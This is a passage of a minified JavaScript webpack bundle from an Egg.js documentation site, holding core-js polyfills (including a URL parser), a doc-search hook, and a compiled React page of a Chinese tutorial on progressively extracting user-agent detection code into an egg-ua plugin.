l(!r.f.call(e,t),e[t])}},vwEN:function(e,t,n){var a=n("u9el");a("Int8",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},vyxk:function(e,t,n){var a=n("a7jj"),r=n("AaXQ"),l=n("q7Pv"),o=l("match");e.exports=function(e){var t;return a(e)&&(void 0!==(t=e[o])?!!t:"RegExp"==r(e))}},w1zT:function(e,t,n){var a=n("0mt+"),r=n("V2dk");a({target:"WeakSet",stat:!0},{from:r})},wJ6r:function(e,t,n){var a=n("0mt+"),r=n("xi+T"),l=n("g24z");a({target:"Math",stat:!0},{fscale:function(e,t,n,a,o){return l(r(e,t,n,a,o))}})},wKda:function(e,t,n){var a=n("9Rcy"),r=n("u3TI"),l=n("zKw/"),o=n("LMem").UNSUPPORTED_Y;a&&("g"!=/./g.flags||o)&&r.f(RegExp.prototype,"flags",{configurable:!0,get:l})},"wWB+":function(e,t,n){var a=n("tPcN");a("Array")},wdLt:function(e,t,n){var a=n("q7Pv"),r=n("GIAz"),l=a("iterator"),o=Array.prototype;e.exports=function(e){return void 0!==e&&(r.Array===e||o[l]===e)}},wpLQ:function(e,t,n){var a=n("N0Us"),r=n("qEhY"),l=n("tS9j"),o=Math.ceil,i=function(e){return function(t,n,i){var c,s,u=String(l(t)),d=u.length,m=void 0===i?" ":String(i),p=a(n);return p<=d||""==m?u:(c=p-d,s=r.call(m,o(c/m.length)),s.length>c&&(s=s.slice(0,c)),e?u+s:s+u)}};e.exports={start:i(!1),end:i(!0)}},wsTr:function(e,t,n){"use strict";var a=n("Rlpu")["default"];function r(){var e=n("FU0I");return r=function(){return e},e}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var l=n("j00X");function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){c(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t,n){return t=s(t),t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e){var t=u(e,"string");return"symbol"===typeof t?t:String(t)}function u(e,t){if("object"!==typeof e||null===e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var a=n.call(e,t||"default");if("object"!==typeof a)return a;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}function d(e,t){return f(e)||g(e,t)||p(e,t)||m()}function m(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function p(e,t){if(e){if("string"===typeof e)return h(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?h(e,t):void 0}}function h(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function g(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function f(e){if(Array.isArray(e))return e}var E=function(e){var t=(0,r().useContext)(l.context),n=t.locale,o=t.routes,i=t.config.locales,c=(0,r().useState)([]),s=d(c,2),u=s[0],m=s[1],p=(0,r().useState)([]),h=d(p,2),g=h[0],f=h[1];return(0,r().useEffect)((function(){m(o.filter((function(e){var t=e.title,a=e.meta,r=(null===a||void 0===a?void 0:a.locale)===n,l=!(null===a||void 0===a?void 0:a.locale)&&(!i.length||n===i[0].name);return t&&(l||r)})).reduce((function(e,t){var n,r,l,o={title:(null===(n=t.meta)||void 0===n?void 0:n.title)||t.title,path:t.path};return(null===(r=t.meta)||void 0===r?void 0:r.group)&&(o.parent=t.meta.group),e.push(o),e.push.apply(e,a(((null===(l=t.meta)||void 0===l?void 0:l.slugs)||[]).filter((function(e){var n,a=e.value;return a!==((null===(n=t.meta)||void 0===n?void 0:n.title)||t.title)})).map((function(e){return{title:e.value,path:"".concat(t.path,"#").concat(e.heading),parent:o}})))),e}),[]))}),[o.length,n]),(0,r().useEffect)((function(){var t=null===e||void 0===e?void 0:e.trim().toUpperCase();if(t){for(var n=[],a=0;a<u.length;a+=1)u[a].title.toUpperCase().indexOf(t)>-1&&n.push(u[a]);f(n)}else f([])}),[e,u.length]),g},b=function(){var e=(0,r().useContext)(l.context),t=e.config.algolia,n=(0,r().useCallback)((function(e){window.docsearch(i({inputSelector:e},t))}),[t]);return n},v=function(e){var t=(0,r().useContext)(l.context),n=t.config,a=E(e),o=b();return n.algolia?o:a};t["default"]=v},wx68:function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("0YMn"),r=n("FU0I");function l(e){var t=r["useRef"](!1),n=r["useState"](e),l=Object(a["a"])(n,2),o=l[0],i=l[1];function c(e,n){n&&t.current||i(e)}return r["useEffect"]((function(){return t.current=!1,function(){t.current=!0}}),[]),[o,c]}},wzTy:function(e,t,n){var a=n("SCbZ"),r=Math.max,l=Math.min;e.exports=function(e,t){var n=a(e);return n<0?r(n+t,0):l(n,t)}},x0yn:function(e,t,n){"use strict";var a=String.prototype.replace,r=/%20/g,l={RFC1738:"RFC1738",RFC3986:"RFC3986"};e.exports={default:l.RFC3986,formatters:{RFC1738:function(e){return a.call(e,r,"+")},RFC3986:function(e){return String(e)}},RFC1738:l.RFC1738,RFC3986:l.RFC3986}},"x5+g":function(e,t,n){var a=n("G9w8"),r=n("W5/F"),l=n("m/os"),o=n("N0Us"),i=n("HmG0"),c=[].push,s=function(e){var t=1==e,n=2==e,s=3==e,u=4==e,d=6==e,m=5==e||d;return function(p,h,g,f){for(var E,b,v=l(p),y=r(v),k=a(h,g,3),w=o(y.length),x=0,j=f||i,S=t?j(p,w):n?j(p,0):void 0;w>x;x++)if((m||x in y)&&(E=y[x],b=k(E,x,v),e))if(t)S[x]=b;else if(b)switch(e){case 3:return!0;case 5:return E;case 6:return x;case 2:c.call(S,E)}else if(u)return!1;return d?-1:s||u?u:S}};e.exports={forEach:s(0),map:s(1),filter:s(2),some:s(3),every:s(4),find:s(5),findIndex:s(6)}},x781:function(e,t,n){"use strict";var a=n("YtQ9"),r=n("N0Us"),l=n("G9w8"),o=function(e,t,n,i,c,s,u,d){var m,p=c,h=0,g=!!u&&l(u,d,3);while(h<i){if(h in n){if(m=g?g(n[h],h,t):n[h],s>0&&a(m))p=o(e,t,m,r(m.length),p,s-1)-1;else{if(p>=9007199254740991)throw TypeError("Exceed the acceptable array length");e[p]=m}p++}h++}return p};e.exports=o},"x9/w":function(e,t,n){var a=n("pX0n"),r=n("a7jj"),l=n("31yA"),o=n("u3TI").f,i=n("vbCh"),c=n("Rx0n"),s=i("meta"),u=0,d=Object.isExtensible||function(){return!0},m=function(e){o(e,s,{value:{objectID:"O"+ ++u,weakData:{}}})},p=function(e,t){if(!r(e))return"symbol"==typeof e?e:("string"==typeof e?"S":"P")+e;if(!l(e,s)){if(!d(e))return"F";if(!t)return"E";m(e)}return e[s].objectID},h=function(e,t){if(!l(e,s)){if(!d(e))return!0;if(!t)return!1;m(e)}return e[s].weakData},g=function(e){return c&&f.REQUIRED&&d(e)&&!l(e,s)&&m(e),e},f=e.exports={REQUIRED:!1,fastKey:p,getWeakData:h,onFreeze:g};a[s]=!0},xSlR:function(e,t,n){"use strict";n("bvZK");var a,r=n("0mt+"),l=n("9Rcy"),o=n("o3Hr"),i=n("A0UU"),c=n("lwrH"),s=n("AzF/"),u=n("k8mt"),d=n("31yA"),m=n("kPJt"),p=n("XBXf"),h=n("Kdrj").codeAt,g=n("iWQo"),f=n("oi/H"),E=n("vKfd"),b=n("lz/I"),v=i.URL,y=E.URLSearchParams,k=E.getState,w=b.set,x=b.getterFor("URL"),j=Math.floor,S=Math.pow,C="Invalid authority",A="Invalid scheme",L="Invalid host",T="Invalid port",N=/[A-Za-z]/,O=/[\d+-.A-Za-z]/,I=/\d/,P=/^(0x|0X)/,R=/^[0-7]+$/,_=/^\d+$/,q=/^[\dA-Fa-f]+$/,M=/[\u0000\u0009\u000A\u000D #%/:?@[\\]]/,F=/[\u0000\u0009\u000A\u000D #/:?@[\\]]/,D=/^[\u0000-\u001F ]+|[\u0000-\u001F ]+$/g,U=/[\u0009\u000A\u000D]/g,z=function(e,t){var n,a,r;if("["==t.charAt(0)){if("]"!=t.charAt(t.length-1))return L;if(n=B(t.slice(1,-1)),!n)return L;e.host=n}else if(Y(e)){if(t=g(t),M.test(t))return L;if(n=H(t),null===n)return L;e.host=n}else{if(F.test(t))return L;for(n="",a=p(t),r=0;r<a.length;r++)n+=K(a[r],$);e.host=n}},H=function(e){var t,n,a,r,l,o,i,c=e.split(".");if(c.length&&""==c[c.length-1]&&c.pop(),t=c.length,t>4)return e;for(n=[],a=0;a<t;a++){if(r=c[a],""==r)return e;if(l=10,r.length>1&&"0"==r.charAt(0)&&(l=P.test(r)?16:8,r=r.slice(8==l?1:2)),""===r)o=0;else{if(!(10==l?_:8==l?R:q).test(r))return e;o=parseInt(r,l)}n.push(o)}for(a=0;a<t;a++)if(o=n[a],a==t-1){if(o>=S(256,5-t))return null}else if(o>255)return null;for(i=n.pop(),a=0;a<n.length;a++)i+=n[a]*S(256,3-a);return i},B=function(e){var t,n,a,r,l,o,i,c=[0,0,0,0,0,0,0,0],s=0,u=null,d=0,m=function(){return e.charAt(d)};if(":"==m()){if(":"!=e.charAt(1))return;d+=2,s++,u=s}while(m()){if(8==s)return;if(":"!=m()){t=n=0;while(n<4&&q.test(m()))t=16*t+parseInt(m(),16),d++,n++;if("."==m()){if(0==n)return;if(d-=n,s>6)return;a=0;while(m()){if(r=null,a>0){if(!("."==m()&&a<4))return;d++}if(!I.test(m()))return;while(I.test(m())){if(l=parseInt(m(),10),null===r)r=l;else{if(0==r)return;r=10*r+l}if(r>255)return;d++}c[s]=256*c[s]+r,a++,2!=a&&4!=a||s++}if(4!=a)return;break}if(":"==m()){if(d++,!m())return}else if(m())return;c[s++]=t}else{if(null!==u)return;d++,s++,u=s}}if(null!==u){o=s-u,s=7;while(0!=s&&o>0)i=c[s],c[s--]=c[u+o-1],c[u+--o]=i}else if(8!=s)return;return c},W=function(e){for(var t=null,n=1,a=null,r=0,l=0;l<8;l++)0!==e[l]?(r>n&&(t=a,n=r),a=null,r=0):(null===a&&(a=l),++r);return r>n&&(t=a,n=r),t},V=function(e){var t,n,a,r;if("number"==typeof e){for(t=[],n=0;n<4;n++)t.unshift(e%256),e=j(e/256);return t.join(".")}if("object"==typeof e){for(t="",a=W(e),n=0;n<8;n++)r&&0===e[n]||(r&&(r=!1),a===n?(t+=n?":":"::",r=!0):(t+=e[n].toString(16),n<7&&(t+=":")));return"["+t+"]"}return e},$={},G=m({},$,{" ":1,'"':1,"<":1,">":1,"`":1}),X=m({},G,{"#":1,"?":1,"{":1,"}":1}),Q=m({},X,{"/":1,":":1,";":1,"=":1,"@":1,"[":1,"\\":1,"]":1,"^":1,"|":1}),K=function(e,t){var n=h(e,0);return n>32&&n<127&&!d(t,e)?e:encodeURIComponent(e)},J={ftp:21,file:null,http:80,https:443,ws:80,wss:443},Y=function(e){return d(J,e.scheme)},Z=function(e){return""!=e.username||""!=e.password},ee=function(e){return!e.host||e.cannotBeABaseURL||"file"==e.scheme},te=function(e,t){var n;return 2==e.length&&N.test(e.charAt(0))&&(":"==(n=e.charAt(1))||!t&&"|"==n)},ne=function(e){var t;return e.length>1&&te(e.slice(0,2))&&(2==e.length||"/"===(t=e.charAt(2))||"\\"===t||"?"===t||"#"===t)},ae=function(e){var t=e.path,n=t.length;!n||"file"==e.scheme&&1==n&&te(t[0],!0)||t.pop()},re=function(e){return"."===e||"%2e"===e.toLowerCase()},le=function(e){return e=e.toLowerCase(),".."===e||"%2e."===e||".%2e"===e||"%2e%2e"===e},oe={},ie={},ce={},se={},ue={},de={},me={},pe={},he={},ge={},fe={},Ee={},be={},ve={},ye={},ke={},we={},xe={},je={},Se={},Ce={},Ae=function(e,t,n,r){var l,o,i,c,s=n||oe,u=0,m="",h=!1,g=!1,f=!1;n||(e.scheme="",e.username="",e.password="",e.host=null,e.port=null,e.path=[],e.query=null,e.fragment=null,e.cannotBeABaseURL=!1,t=t.replace(D,"")),t=t.replace(U,""),l=p(t);while(u<=l.length){switch(o=l[u],s){case oe:if(!o||!N.test(o)){if(n)return A;s=ce;continue}m+=o.toLowerCase(),s=ie;break;case ie:if(o&&(O.test(o)||"+"==o||"-"==o||"."==o))m+=o.toLowerCase();else{if(":"!=o){if(n)return A;m="",s=ce,u=0;continue}if(n&&(Y(e)!=d(J,m)||"file"==m&&(Z(e)||null!==e.port)||"file"==e.scheme&&!e.host))return;if(e.scheme=m,n)return void(Y(e)&&J[e.scheme]==e.port&&(e.port=null));m="","file"==e.scheme?s=ve:Y(e)&&r&&r.scheme==e.scheme?s=se:Y(e)?s=pe:"/"==l[u+1]?(s=ue,u++):(e.cannotBeABaseURL=!0,e.path.push(""),s=je)}break;case ce:if(!r||r.cannotBeABaseURL&&"#"!=o)return A;if(r.cannotBeABaseURL&&"#"==o){e.scheme=r.scheme,e.path=r.path.slice(),e.query=r.query,e.fragment="",e.cannotBeABaseURL=!0,s=Ce;break}s="file"==r.scheme?ve:de;continue;case se:if("/"!=o||"/"!=l[u+1]){s=de;continue}s=he,u++;break;case ue:if("/"==o){s=ge;break}s=xe;continue;case de:if(e.scheme=r.scheme,o==a)e.username=r.username,e.password=r.password,e.host=r.host,e.port=r.port,e.path=r.path.slice(),e.query=r.query;else if("/"==o||"\\"==o&&Y(e))s=me;else if("?"==o)e.username=r.username,e.password=r.password,e.host=r.host,e.port=r.port,e.path=r.path.slice(),e.query="",s=Se;else{if("#"!=o){e.username=r.username,e.password=r.password,e.host=r.host,e.port=r.port,e.path=r.path.slice(),e.path.pop(),s=xe;continue}e.username=r.username,e.password=r.password,e.host=r.host,e.port=r.port,e.path=r.path.slice(),e.query=r.query,e.fragment="",s=Ce}break;case me:if(!Y(e)||"/"!=o&&"\\"!=o){if("/"!=o){e.username=r.username,e.password=r.password,e.host=r.host,e.port=r.port,s=xe;continue}s=ge}else s=he;break;case pe:if(s=he,"/"!=o||"/"!=m.charAt(u+1))continue;u++;break;case he:if("/"!=o&&"\\"!=o){s=ge;continue}break;case ge:if("@"==o){h&&(m="%40"+m),h=!0,i=p(m);for(var E=0;E<i.length;E++){var b=i[E];if(":"!=b||f){var v=K(b,Q);f?e.password+=v:e.username+=v}else f=!0}m=""}else if(o==a||"/"==o||"?"==o||"#"==o||"\\"==o&&Y(e)){if(h&&""==m)return C;u-=p(m).length+1,m="",s=fe}else m+=o;break;case fe:case Ee:if(n&&"file"==e.scheme){s=ke;continue}if(":"!=o||g){if(o==a||"/"==o||"?"==o||"#"==o||"\\"==o&&Y(e)){if(Y(e)&&""==m)return L;if(n&&""==m&&(Z(e)||null!==e.port))return;if(c=z(e,m),c)return c;if(m="",s=we,n)return;continue}"["==o?g=!0:"]"==o&&(g=!1),m+=o}else{if(""==m)return L;if(c=z(e,m),c)return c;if(m="",s=be,n==Ee)return}break;case be:if(!I.test(o)){if(o==a||"/"==o||"?"==o||"#"==o||"\\"==o&&Y(e)||n){if(""!=m){var y=parseInt(m,10);if(y>65535)return T;e.port=Y(e)&&y===J[e.scheme]?null:y,m=""}if(n)return;s=we;continue}return T}m+=o;break;case ve:if(e.scheme="file","/"==o||"\\"==o)s=ye;else{if(!r||"file"!=r.scheme){s=xe;continue}if(o==a)e.host=r.host,e.path=r.path.slice(),e.query=r.query;else if("?"==o)e.host=r.host,e.path=r.path.slice(),e.query="",s=Se;else{if("#"!=o){ne(l.slice(u).join(""))||(e.host=r.host,e.path=r.path.slice(),ae(e)),s=xe;continue}e.host=r.host,e.path=r.path.slice(),e.query=r.query,e.fragment="",s=Ce}}break;case ye:if("/"==o||"\\"==o){s=ke;break}r&&"file"==r.scheme&&!ne(l.slice(u).join(""))&&(te(r.path[0],!0)?e.path.push(r.path[0]):e.host=r.host),s=xe;continue;case ke:if(o==a||"/"==o||"\\"==o||"?"==o||"#"==o){if(!n&&te(m))s=xe;else if(""==m){if(e.host="",n)return;s=we}else{if(c=z(e,m),c)return c;if("localhost"==e.host&&(e.host=""),n)return;m="",s=we}continue}m+=o;break;case we:if(Y(e)){if(s=xe,"/"!=o&&"\\"!=o)continue}else if(n||"?"!=o)if(n||"#"!=o){if(o!=a&&(s=xe,"/"!=o))continue}else e.fragment="",s=Ce;else e.query="",s=Se;break;case xe:if(o==a||"/"==o||"\\"==o&&Y(e)||!n&&("?"==o||"#"==o)){if(le(m)?(ae(e),"/"==o||"\\"==o&&Y(e)||e.path.push("")):re(m)?"/"==o||"\\"==o&&Y(e)||e.path.push(""):("file"==e.scheme&&!e.path.length&&te(m)&&(e.host&&(e.host=""),m=m.charAt(0)+":"),e.path.push(m)),m="","file"==e.scheme&&(o==a||"?"==o||"#"==o))while(e.path.length>1&&""===e.path[0])e.path.shift();"?"==o?(e.query="",s=Se):"#"==o&&(e.fragment="",s=Ce)}else m+=K(o,X);break;case je:"?"==o?(e.query="",s=Se):"#"==o?(e.fragment="",s=Ce):o!=a&&(e.path[0]+=K(o,$));break;case Se:n||"#"!=o?o!=a&&("'"==o&&Y(e)?e.query+="%27":e.query+="#"==o?"%23":K(o,$)):(e.fragment="",s=Ce);break;case Ce:o!=a&&(e.fragment+=K(o,G));break}u++}},Le=function(e){var t,n,a=u(this,Le,"URL"),r=arguments.length>1?arguments[1]:void 0,o=String(e),i=w(a,{type:"URL"});if(void 0!==r)if(r instanceof Le)t=x(r);else if(n=Ae(t={},String(r)),n)throw TypeError(n);if(n=Ae(i,o,null,t),n)throw TypeError(n);var c=i.searchParams=new y,s=k(c);s.updateSearchParams(i.query),s.updateURL=function(){i.query=String(c)||null},l||(a.href=Ne.call(a),a.origin=Oe.call(a),a.protocol=Ie.call(a),a.username=Pe.call(a),a.password=Re.call(a),a.host=_e.call(a),a.hostname=qe.call(a),a.port=Me.call(a),a.pathname=Fe.call(a),a.search=De.call(a),a.searchParams=Ue.call(a),a.hash=ze.call(a))},Te=Le.prototype,Ne=function(){var e=x(this),t=e.scheme,n=e.username,a=e.password,r=e.host,l=e.port,o=e.path,i=e.query,c=e.fragment,s=t+":";return null!==r?(s+="//",Z(e)&&(s+=n+(a?":"+a:"")+"@"),s+=V(r),null!==l&&(s+=":"+l)):"file"==t&&(s+="//"),s+=e.cannotBeABaseURL?o[0]:o.length?"/"+o.join("/"):"",null!==i&&(s+="?"+i),null!==c&&(s+="#"+c),s},Oe=function(){var e=x(this),t=e.scheme,n=e.port;if("blob"==t)try{return new URL(t.path[0]).origin}catch(a){return"null"}return"file"!=t&&Y(e)?t+"://"+V(e.host)+(null!==n?":"+n:""):"null"},Ie=function(){return x(this).scheme+":"},Pe=function(){return x(this).username},Re=function(){return x(this).password},_e=function(){var e=x(this),t=e.host,n=e.port;return null===t?"":null===n?V(t):V(t)+":"+n},qe=function(){var e=x(this).host;return null===e?"":V(e)},Me=function(){var e=x(this).port;return null===e?"":String(e)},Fe=function(){var e=x(this),t=e.path;return e.cannotBeABaseURL?t[0]:t.length?"/"+t.join("/"):""},De=function(){var e=x(this).query;return e?"?"+e:""},Ue=function(){return x(this).searchParams},ze=function(){var e=x(this).fragment;return e?"#"+e:""},He=function(e,t){return{get:e,set:t,configurable:!0,enumerable:!0}};if(l&&c(Te,{href:He(Ne,(function(e){var t=x(this),n=String(e),a=Ae(t,n);if(a)throw TypeError(a);k(t.searchParams).updateSearchParams(t.query)})),origin:He(Oe),protocol:He(Ie,(function(e){var t=x(this);Ae(t,String(e)+":",oe)})),username:He(Pe,(function(e){var t=x(this),n=p(String(e));if(!ee(t)){t.username="";for(var a=0;a<n.length;a++)t.username+=K(n[a],Q)}})),password:He(Re,(function(e){var t=x(this),n=p(String(e));if(!ee(t)){t.password="";for(var a=0;a<n.length;a++)t.password+=K(n[a],Q)}})),host:He(_e,(function(e){var t=x(this);t.cannotBeABaseURL||Ae(t,String(e),fe)})),hostname:He(qe,(function(e){var t=x(this);t.cannotBeABaseURL||Ae(t,String(e),Ee)})),port:He(Me,(function(e){var t=x(this);ee(t)||(e=String(e),""==e?t.port=null:Ae(t,e,be))})),pathname:He(Fe,(function(e){var t=x(this);t.cannotBeABaseURL||(t.path=[],Ae(t,e+"",we))})),search:He(De,(function(e){var t=x(this);e=String(e),""==e?t.query=null:("?"==e.charAt(0)&&(e=e.slice(1)),t.query="",Ae(t,e,Se)),k(t.searchParams).updateSearchParams(t.query)})),searchParams:He(Ue),hash:He(ze,(function(e){var t=x(this);e=String(e),""!=e?("#"==e.charAt(0)&&(e=e.slice(1)),t.fragment="",Ae(t,e,Ce)):t.fragment=null}))}),s(Te,"toJSON",(function(){return Ne.call(this)}),{enumerable:!0}),s(Te,"toString",(function(){return Ne.call(this)}),{enumerable:!0}),v){var Be=v.createObjectURL,We=v.revokeObjectURL;Be&&s(Le,"createObjectURL",(function(e){return Be.apply(v,arguments)})),We&&s(Le,"revokeObjectURL",(function(e){return We.apply(v,arguments)}))}f(Le,"URL"),r({global:!0,forced:!o,sham:!l},{URL:Le})},"xi+T":function(e,t){e.exports=Math.scale||function(e,t,n,a,r){return 0===arguments.length||e!=e||t!=t||n!=n||a!=a||r!=r?NaN:e===1/0||e===-1/0?e:(e-t)*(r-a)/(n-t)+a}},"xv++":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5728 Egg \u91cc\u9762\uff0c\u6709",r.a.createElement(l["Link"],{to:"../basics/plugin"},"\u63d2\u4ef6"),"\uff0c\u4e5f\u6709",r.a.createElement(l["Link"],{to:"../advanced/framework"},"\u6846\u67b6"),"\uff0c\u524d\u8005\u8fd8\u5305\u62ec\u4e86 ",r.a.createElement("code",null,"path")," \u548c ",r.a.createElement("code",null,"package")," \u4e24\u79cd\u52a0\u8f7d\u6a21\u5f0f\uff0c\u90a3\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u9009\u62e9\u5462\uff1f"),r.a.createElement("p",null,"\u672c\u6587\u5c06\u4ee5\u5b9e\u4f8b\u7684\u65b9\u5f0f\uff0c\u4e00\u6b65\u6b65\u7ed9\u5927\u5bb6\u6f14\u793a\u4e0b\uff0c\u5982\u4f55\u6e10\u8fdb\u5f0f\u5730\u8fdb\u884c\u4ee3\u7801\u6f14\u8fdb\u3002"),r.a.createElement("p",null,"\u5168\u90e8\u7684\u793a\u4f8b\u4ee3\u7801\u53ef\u4ee5\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive"},"eggjs/examples/progressive"),"\u3002"),r.a.createElement("h2",{id:"\u6700\u521d\u59cb\u7684\u72b6\u6001"},r.a.createElement(l["AnchorLink"],{to:"#\u6700\u521d\u59cb\u7684\u72b6\u6001","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6700\u521d\u59cb\u7684\u72b6\u6001"),r.a.createElement("p",null,"\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u6bb5\u5206\u6790 UA \u7684\u4ee3\u7801\uff0c\u5b9e\u73b0\u4ee5\u4e0b\u529f\u80fd\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.isAndroid")),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.isIOS"))),r.a.createElement("p",null,"\u901a\u8fc7\u4e4b\u524d\u7684\u6559\u7a0b\uff0c\u5927\u5bb6\u4e00\u5b9a\u53ef\u4ee5\u5f88\u5feb\u5730\u5199\u51fa\u6765\uff0c\u6211\u4eec\u5feb\u901f\u56de\u987e\u4e0b\uff1a"),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u4ee3\u7801\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step1"},"step1"),"\u3002"),r.a.createElement("p",null,"\u76ee\u5f55\u7ed3\u6784\uff1a"),r.a.createElement(o["a"],{code:"example-app\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 extend\n\u2502   \u2502   \u2514\u2500\u2500 context.js\n\u2502   \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 test\n\u2502   \u2514\u2500\u2500 index.test.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"\u6838\u5fc3\u4ee3\u7801\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nmodule.exports = {\n  get isIOS() {\n    const iosReg = /iphone|ipad|ipod/i;\n    return iosReg.test(this.get('user-agent'));\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"\u63d2\u4ef6\u7684\u96cf\u5f62"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u7684\u96cf\u5f62","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u7684\u96cf\u5f62"),r.a.createElement("p",null,"\u6211\u4eec\u5f88\u660e\u663e\u80fd\u611f\u77e5\u5230\uff0c\u8fd9\u6bb5\u903b\u8f91\u662f\u5177\u5907\u901a\u7528\u6027\u7684\uff0c\u53ef\u4ee5\u5199\u6210\u63d2\u4ef6\u3002"),r.a.createElement("p",null,"\u4f46\u4e00\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u529f\u80fd\u8fd8\u6ca1\u5b8c\u5584\uff0c\u76f4\u63a5\u72ec\u7acb\u63d2\u4ef6\uff0c\u7ef4\u62a4\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\u3002"),r.a.createElement("p",null,"\u6b64\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4ee3\u7801\u5199\u6210\u63d2\u4ef6\u7684\u5f62\u5f0f\uff0c\u4f46\u5e76\u4e0d\u72ec\u7acb\u51fa\u53bb\u3002"),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u4ee3\u7801\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step2"},"step2"),"\u3002"),r.a.createElement("p",null,"\u65b0\u7684\u76ee\u5f55\u7ed3\u6784\uff1a"),r.a.createElement(o["a"],{code:"example-app\n\u251c\u2500\u2500 app\n\u2502   \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 config\n\u2502   \u2514\u2500\u2500 plugin.js\n\u251c\u2500\u2500 lib\n\u2502   \u2514\u2500\u2500 plugin\n\u2502       \u2514\u2500\u2500 egg-ua\n\u2502           \u251c\u2500\u2500 app\n\u2502           \u2502   \u2514\u2500\u2500 extend\n\u2502           \u2502       \u2514\u2500\u2500 context.js\n\u2502           \u2514\u2500\u2500 package.json\n\u251c\u2500\u2500 test\n\u2502   \u2514\u2500\u2500 index.test.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"\u6838\u5fc3\u4ee3\u7801\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"app/extend/context.js")," \u79fb\u52a8\u5230 ",r.a.createElement("code",null,"lib/plugin/egg-ua/app/extend/context.js"),"\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"lib/plugin/egg-ua/package.json")," \u58f0\u660e\u63d2\u4ef6\u3002"))),r.a.createElement(o["a"],{code:'{\n  "eggPlugin": {\n    "name": "ua"\n  }\n}',lang:"json"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"config/plugin.js")," \u4e2d\u901a\u8fc7 ",r.a.createElement("code",null,"path")," \u6765\u6302\u8f7d\u63d2\u4ef6\u3002")),r.a.createElement(o["a"],{code:"// config/plugin.js\nconst path = require('path');\nexports.ua = {\n  enable: true,\n  path: path.join(__dirname, '../lib/plugin/egg-ua'),\n};",lang:"js"}),r.a.createElement("h2",{id:"\u62bd\u6210\u72ec\u7acb\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u62bd\u6210\u72ec\u7acb\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u62bd\u6210\u72ec\u7acb\u63d2\u4ef6"),r.a.createElement("p",null,"\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u5f00\u53d1\u540e\uff0c\u8be5\u6a21\u5757\u7684\u529f\u80fd\u6210\u719f\uff0c\u6b64\u65f6\u53ef\u4ee5\u8003\u8651\u62bd\u51fa\u6765\u6210\u4e3a\u72ec\u7acb\u7684\u63d2\u4ef6\u3002"),r.a.createElement("p",null,"\u9996\u5148\uff0c\u6211\u4eec\u62bd\u51fa\u4e00\u4e2a egg-ua 